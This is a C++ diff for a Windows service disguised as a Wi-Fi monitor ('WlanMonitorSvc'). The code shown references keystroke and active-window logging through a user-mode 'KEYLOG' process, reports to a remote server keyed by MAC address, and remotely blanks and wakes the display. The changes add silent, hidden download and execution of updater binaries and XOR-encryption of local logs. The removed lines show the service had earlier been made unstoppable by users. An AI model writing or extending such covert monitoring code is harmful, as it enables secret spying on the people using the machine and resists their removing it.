@@ -40,7 +40,7 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.8.3"
+#define MANUAL_COMPILE_VERSION "1.8.14"
 // ==============================================================
 
 // 定义当前程序版本和服务器更新地址
@@ -58,6 +58,18 @@ const std::string REPORT_URL_BASE = "https://jianbingozi.com/report";  // Cloudf
 HANDLE g_hMutex = NULL;
 ULONGLONG g_ServiceStartTime = 0; // 存放程序/服务刚启动时的时间
 HHOOK g_hKeyHook = NULL;
+const char* UPDATE_EXIT_EVENT_NAME = "Global\\WlanMonitorSvc_UpdateExit_Event";
+
+bool IsUpdateExitRequested() {
+    HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, UPDATE_EXIT_EVENT_NAME);
+    if (!hEvent) {
+        return false;
+    }
+
+    bool requested = (WaitForSingleObject(hEvent, 0) == WAIT_OBJECT_0);
+    CloseHandle(hEvent);
+    return requested;
+}
 
 // 指定为Windows子系统，运行时不显示控制台黑窗
 #pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
@@ -593,12 +605,66 @@ std::string GetExePath() {
     return std::string(buffer);
 }
 
+bool IsUsableExeFile(const std::string& path) {
+    std::ifstream file(path, std::ios::binary | std::ios::ate);
+    if (!file.is_open()) {
+        return false;
+    }
+
+    std::streamoff size = file.tellg();
+    if (size < 1024) {
+        return false;
+    }
+
+    file.seekg(0, std::ios::beg);
+    char mz[2] = {};
+    file.read(mz, sizeof(mz));
+    return file.good() && mz[0] == 'M' && mz[1] == 'Z';
+}
+
 // 先声明，让后面可以调用
 std::string ExecCmd(const std::string& cmd, bool outputIsUtf8 = false);
 std::string GetMacAddress();
 std::string UrlEncode(const std::string& str);
 std::string EncryptString(const std::string& data);
 std::string DecryptString(const std::string& hexStr);
+
+// 加密实现：使用 XOR 和 Hex 编码
+std::string EncryptString(const std::string& data) {
+    const std::string key = "PowerOFF2026";
+    std::string encrypted;
+
+    for (size_t i = 0; i < data.length(); ++i) {
+        unsigned char byte = (unsigned char)data[i];
+        unsigned char keyChar = key[i % key.length()];
+        unsigned char xorByte = byte ^ keyChar;
+
+        // 转换为 Hex 字符串
+        char hexBuf[3];
+        sprintf_s(hexBuf, sizeof(hexBuf), "%02X", xorByte);
+        encrypted += hexBuf;
+    }
+
+    return encrypted;
+}
+
+// 解密实现：反向 XOR 和 Hex 解码
+std::string DecryptString(const std::string& hexStr) {
+    const std::string key = "PowerOFF2026";
+    std::string decrypted;
+
+    for (size_t i = 0; i < hexStr.length(); i += 2) {
+        if (i + 1 < hexStr.length()) {
+            std::string hexByte = hexStr.substr(i, 2);
+            unsigned char xorByte = (unsigned char)std::stoul(hexByte, nullptr, 16);
+            unsigned char keyChar = key[(i / 2) % key.length()];
+            unsigned char originalByte = xorByte ^ keyChar;
+            decrypted += (char)originalByte;
+        }
+    }
+
+    return decrypted;
+}
 
 // 独立异步线程上传本地日志到云端
 void UploadLogToServer() {
@@ -638,10 +704,12 @@ void WriteLog(const std::string& message) {
     std::ofstream logFile(logPath, isTooLarge ? std::ios::trunc : std::ios::app);
     if (logFile.is_open()) {
         std::string rawLog = "[" + GetCurrentTimeStr() + "] " + message;
-        logFile << rawLog << std::endl;
+        std::string encryptedLog = EncryptString(rawLog);
+        logFile << encryptedLog << std::endl;
         logFile.close();
     }
 }
+
 
 #ifndef SERVICE_CONFIG_FAILURE_ACTIONS_FLAG
 #define SERVICE_CONFIG_FAILURE_ACTIONS_FLAG 4
@@ -759,6 +827,7 @@ void CheckForUpdates() {
 
     std::string versionUrl = UPDATE_URL_BASE + "version.txt?t=" + timestamp + "&mac=" + UrlEncode(mac);
     std::string exeUrl = UPDATE_URL_BASE + "WlanMonitorSvc.exe?t=" + timestamp + "&mac=" + UrlEncode(mac);
+    std::string updaterUrl = UPDATE_URL_BASE + "WlanMonitorSvc.updater.exe?t=" + timestamp + "&mac=" + UrlEncode(mac);
     std::string tempVersionFile = GetExePath() + ".ver";
 
     WriteLog("【更新】开始连接服务器检查自动更新...");
@@ -766,6 +835,7 @@ void CheckForUpdates() {
     // 1. 清除系统自带的IE网络缓存，否则会一直读取到旧的缓存内容
     DeleteUrlCacheEntryA(versionUrl.c_str());
     DeleteUrlCacheEntryA(exeUrl.c_str());
+    DeleteUrlCacheEntryA(updaterUrl.c_str());
 
     // 尝试下载 version.txt
     DeleteFileA(tempVersionFile.c_str());
@@ -797,12 +867,26 @@ void CheckForUpdates() {
                 WriteLog("【更新】发现新版本: [" + latestVersion + "] (当前版本: [" + CURRENT_VERSION + "])，正在后台静默下载...");
 
                 std::string newExePath = GetExePath() + ".new";
+                std::string updaterPath = GetExePath() + ".updater.exe";
                 DeleteFileA(newExePath.c_str());
+                DeleteFileA(updaterPath.c_str());
+
+                // 下载新版本 exe
                 hr = URLDownloadToFileA(NULL, exeUrl.c_str(), newExePath.c_str(), 0, NULL);
-                if (hr == S_OK) {
-                    WriteLog("【更新】新版本下载完成，正在应用更新并重启...");
+                if (hr != S_OK || !IsUsableExeFile(newExePath)) {
+                    WriteLog("【更新】下载新版本失败，或下载到的文件不是有效 EXE");
+                    DeleteFileA(newExePath.c_str());
+                    return;
+                }
+
+                // 下载 updater.exe（从版本号相同的目录）
+                hr = URLDownloadToFileA(NULL, updaterUrl.c_str(), updaterPath.c_str(), 0, NULL);
+
+                if (hr == S_OK && IsUsableExeFile(updaterPath)) {
+                    WriteLog("【更新】新版本和更新器下载完成，启动更新器...");
 
                     // 写入本次尝试更新的版本号防死循环
+                    std::string lockFile = GetExePath() + ".up_lock";
                     std::ofstream outLf(lockFile, std::ios::trunc);
                     outLf << latestVersion;
                     outLf.close();
@@ -814,56 +898,64 @@ void CheckForUpdates() {
                         g_hMutex = NULL;
                     }
 
-                    std::string exeName = currentExePath.substr(currentExePath.find_last_of("\\/") + 1);
-                    std::string oldPath = currentExePath + ".old_" + std::to_string(GetTickCount64());
-                    // 核心关键点：Windows 允许重命名正在运行的 EXE。先尝试重命名为 .old_，释放原文件名
-                    MoveFileA(currentExePath.c_str(), oldPath.c_str());
-
-                    // 写入更新批处理脚本，在服务彻底退出后执行文件覆盖，确保100%成功无占用
-                    std::string batPath = currentExePath + "_update.bat";
-                    std::ofstream bat(batPath, std::ios::trunc);
-                    if (bat.is_open()) {
-                        bat << "@echo off\r\n";
-                        bat << ":loop\r\n";
-                        // 不断循环杀掉所有可能的残留进程
-                        bat << "taskkill /f /im \"" << exeName << "\" > nul 2>&1\r\n"; 
-                        // 尝试将新文件覆盖过来
-                        bat << "move /y \"" << newExePath << "\" \"" << currentExePath << "\" > nul 2>&1\r\n";
-                        // 如果新下载的文件还存在(没被mv走)，说明重命名/覆盖失败了，退避0.5秒后继续尝试
-                        bat << "if exist \"" << newExePath << "\" (\r\n";
-                        bat << "    ping 127.0.0.1 -n 2 > nul\r\n";
-                        bat << "    goto loop\r\n";
-                        bat << ")\r\n";
-
-                        // 覆盖成功，拉起服务
-                        bat << "net start WlanMonitorSvc > nul 2>&1\r\n"; 
-                        bat << "del \"%~f0\"\r\n"; // 批处理自毁
-                        bat.close();
-
-                        // 后台隐蔽运行批处理脚本，由批处理接管更新覆盖生命周期
-                        SHELLEXECUTEINFOA sei = { sizeof(sei) };
-                        sei.lpVerb = "open"; 
-                        sei.lpFile = batPath.c_str(); 
-                        sei.nShow = SW_HIDE;                
-                        ShellExecuteExA(&sei);
-                    } else {
-                        WriteLog("【更新】写入批处理脚本失败，回退尝试执行内置重命名策略...");
-                        MoveFileA(newExePath.c_str(), currentExePath.c_str());
-
-                        SHELLEXECUTEINFOA sei = { sizeof(sei) };
-                        sei.lpVerb = "open"; 
-                        sei.lpFile = "cmd.exe"; 
-                        static std::string cmdParams = "/c taskkill /f /im \"" + exeName + "\" > nul 2>&1 & ping 127.0.0.1 -n 2 > nul & net start WlanMonitorSvc";
-                        sei.lpParameters = cmdParams.c_str(); 
-                        sei.nShow = SW_HIDE;                
-                        ShellExecuteExA(&sei);
+                    // 创建事件允许 Updater 停止服务，Updater 完成后会清除此事件
+                    const char* ALLOW_SERVICE_STOP_EVENT = "Global\\WlanMonitorSvc_AllowServiceStop_Event";
+                    HANDLE hAllowStopEvent = CreateEventA(NULL, TRUE, FALSE, ALLOW_SERVICE_STOP_EVENT);
+                    if (hAllowStopEvent) {
+                        SetEvent(hAllowStopEvent);
+                        CloseHandle(hAllowStopEvent);
                     }
 
-                    // 立即自尽结束当前服务实例，释放文件锁定
-                    exit(1);
+                    // 启动 updater.exe，传入参数：当前程序路径、新程序路径
+                    // updater.exe "C:\path\to\WlanMonitorSvc.exe" "C:\path\to\WlanMonitorSvc.exe.new"
+                    std::string updaterParams = "\"" + currentExePath + "\" \"" + newExePath + "\"";
+
+                    SHELLEXECUTEINFOA sei = { sizeof(sei) };
+                    sei.lpVerb = "open"; 
+                    sei.lpFile = updaterPath.c_str();
+                    sei.lpParameters = updaterParams.c_str();
+                    sei.nShow = SW_HIDE;                
+                    if (ShellExecuteExA(&sei)) {
+                        WriteLog("【更新】更新器已启动，程序即将退出...");
+                        exit(0);
+                    }
+
+                    WriteLog("【更新】更新器启动失败，错误码: " + std::to_string(GetLastError()) + "，回退使用原有方案...");
                 } else {
-                    WriteLog("【更新】版本文件新二进制文件获取失败，HRESULT: " + std::to_string(hr));
+                    WriteLog("【更新】下载更新器失败或文件无效，回退使用原有方案...");
+                    DeleteFileA(updaterPath.c_str());
                 }
+
+                // 回退方案：使用原有的 batch 脚本方式
+                WriteLog("【更新】新版本已下载，正在应用更新并重启...");
+
+                std::string currentExePath = GetExePath();
+                std::string exeName = currentExePath.substr(currentExePath.find_last_of("\\/") + 1);
+                std::string oldPath = currentExePath + ".old_" + std::to_string(GetTickCount64());
+                MoveFileA(currentExePath.c_str(), oldPath.c_str());
+
+                std::string batPath = currentExePath + "_update.bat";
+                std::ofstream bat(batPath, std::ios::trunc);
+                if (bat.is_open()) {
+                    bat << "@echo off\r\n";
+                    bat << ":loop\r\n";
+                    bat << "taskkill /f /im \"" << exeName << "\" > nul 2>&1\r\n"; 
+                    bat << "move /y \"" << newExePath << "\" \"" << currentExePath << "\" > nul 2>&1\r\n";
+                    bat << "if exist \"" << newExePath << "\" (\r\n";
+                    bat << "    ping 127.0.0.1 -n 2 > nul\r\n";
+                    bat << "    goto loop\r\n";
+                    bat << ")\r\n";
+                    bat << "net start WlanMonitorSvc > nul 2>&1\r\n"; 
+                    bat << "del \"%~f0\"\r\n";
+                    bat.close();
+
+                    SHELLEXECUTEINFOA sei = { sizeof(sei) };
+                    sei.lpVerb = "open"; 
+                    sei.lpFile = batPath.c_str(); 
+                    sei.nShow = SW_HIDE;                
+                    ShellExecuteExA(&sei);
+                }
+                exit(0);
             } else {
                 WriteLog("【更新】检测完毕，未发现新版本，当前处于最新。");
             }
@@ -876,7 +968,6 @@ void CheckForUpdates() {
         WriteLog("【更新】无法连接到服务器获取版本信息(version.txt)，HRESULT: " + std::to_string(hr));
     }
 }
-
 // 获取网卡MAC地址（通常用来唯一标识一台电脑）
 std::string GetMacAddress() {
     IP_ADAPTER_INFO AdapterInfo[16];
@@ -1681,6 +1772,10 @@ void ReportToServer() {
 // 向服务器报备上线的专注线程，使用长轮询保持实时连接
 DWORD WINAPI ReportThread(LPVOID lpParam) {
     while (true) {
+        if (IsUpdateExitRequested()) {
+            WriteLog("【更新】ReportThread 收到更新退出信号，线程结束。");
+            break;
+        }
         ReportToServer();
         Sleep(100); // 挂起时长缩短为 100ms 降低执行延迟
     }
@@ -1718,6 +1813,11 @@ void MonitorWiFiLoop() {
     DeleteFileA((GetExePath() + ".new").c_str());
 
     while (true) {
+        if (IsUpdateExitRequested()) {
+            WriteLog("【更新】主服务循环收到更新退出信号，准备退出以释放程序文件。");
+            break;
+        }
+
         // 尝试维持用户级常驻代理（按键+活动窗口监测）运行
         static ULONGLONG lastKeylogLaunch = 0;
         ULONGLONG currentTime = GetTickCount64();
@@ -1904,6 +2004,18 @@ SERVICE_STATUS g_ServiceStatus = {0};
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
 
 void WINAPI ServiceCtrlHandler(DWORD dwControl) {
+    if (dwControl == SERVICE_CONTROL_STOP) {
+        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+
+        HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, UPDATE_EXIT_EVENT_NAME);
+        if (hEvent) {
+            SetEvent(hEvent);
+            CloseHandle(hEvent);
+        }
+        return;
+    }
+
     if (dwControl == SERVICE_CONTROL_SHUTDOWN) {
         g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
         SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
@@ -1918,8 +2030,7 @@ void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
 
     g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    // 去除 SERVICE_ACCEPT_STOP 以使用户无法从“服务”管理器面板手动点击停止
-    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
+    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
     g_ServiceStatus.dwWin32ExitCode = 0;
     g_ServiceStatus.dwCheckPoint = 0;
     g_ServiceStatus.dwWaitHint = 0;
@@ -2328,6 +2439,13 @@ int main()
                 }
             });
 
+            SetTimer(NULL, 99, 500, [](HWND, UINT, UINT_PTR, DWORD) {
+                if (IsUpdateExitRequested()) {
+                    WriteLog("【更新】用户态 KEYLOG 进程收到更新退出信号，准备退出。");
+                    PostQuitMessage(0);
+                }
+            });
+
             MSG msg;
             while(GetMessage(&msg, NULL, 0, 0)) {
                 TranslateMessage(&msg);
@@ -2385,29 +2503,34 @@ int main()
         }
 
         if (cmdLine.find("MONITOR_OFF") != std::string::npos) {
+            // 显示器黑屏：使用 WM_SYSCOMMAND 真正关闭显示器（显示器进入待机/睡眠状态）
+            // 参数 2 = 关闭显示器
             DWORD_PTR dwResult = 0;
             SendMessageTimeoutA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2, SMTO_ABORTIFHUNG, 2000, &dwResult);
             return 0;
         }
 
         if (cmdLine.find("MONITOR_ON") != std::string::npos) {
-            // 唤醒显示器：更稳定的组合逻辑
-            // 1. 强制系统重置挂机息屏计时器，声明需要显示器
-            SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);
+            // 显示器亮屏：使用多种方法确保显示器从睡眠状态唤醒
+            // 参数 -1 = 唤醒/打开显示器
 
-            // 2. 向系统发送解雇屏保和电源唤醒广播
+            // 1. 发送唤醒信号
             DWORD_PTR dwResult = 0;
-            SendMessageTimeoutA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1, SMTO_ABORTIFHUNG, 1000, &dwResult);
+            SendMessageTimeoutA(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1, SMTO_ABORTIFHUNG, 2000, &dwResult);
+            Sleep(200);
 
-            // 3. 模拟无害但真实的键盘输入 (无实际影响的 F15 键)
+            // 2. 声明系统需要显示器
+            SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);
+            Sleep(100);
+
+            // 3. 模拟键盘按键唤醒
             keybd_event(VK_F15, 0, 0, 0);
             keybd_event(VK_F15, 0, KEYEVENTF_KEYUP, 0);
+            Sleep(100);
 
-            // 4. 彻底解决屏幕深度休眠问题：增加鼠标位移幅度并增加一定延迟
-            // (之前移动 1 像素并且没延迟，经常会被 Windows 当作硬件抖动噪音或执行过快被忽略)
-            Sleep(50);
+            // 4. 模拟鼠标移动唤醒
             mouse_event(MOUSEEVENTF_MOVE, 0, 5, 0, 0);
-            Sleep(50);
+            Sleep(100);
             mouse_event(MOUSEEVENTF_MOVE, 0, -5, 0, 0);
 
             return 0;
